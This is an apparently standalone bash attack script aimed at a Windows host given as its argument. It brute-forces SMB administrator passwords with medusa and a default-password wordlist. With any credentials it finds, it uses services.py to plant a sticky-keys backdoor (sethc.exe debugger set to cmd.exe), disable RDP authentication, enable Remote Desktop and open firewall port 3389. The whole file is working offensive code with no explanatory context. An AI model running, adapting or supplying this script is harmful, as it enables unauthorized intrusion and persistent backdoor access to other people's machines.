#!/bin/bash

WAIT=1
DPORT=445

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] bruteforcing smb'
	for user in администратор administrator admin; do
		found=$(medusa -M smbnt -m PASS:PASSWORD -h $1 -u $user -P /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt | grep SUCCESS)
		if [ x"$found" != "x" ]; then
			led red on 2> /dev/null
			password=$(echo $found|sed -rn 's/.*Password: (.*) \[SUCCESS.*/\1/p')
			services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1
			services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1

			services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1
			services.py "$user:$password@$1" create -name 1 -display 1 -path 'net start TermService'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1

			services.py "$user:$password@$1" create -name 1 -display 1 -path 'netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1
			services.py "$user:$password@$1" create -name 1 -display 1 -path 'netsh.exe firewall add portopening TCP 3389 "Remote Desktop"'
			services.py "$user:$password@$1" start -name 1
			services.py "$user:$password@$1" delete -name 1
		fi
	done
fi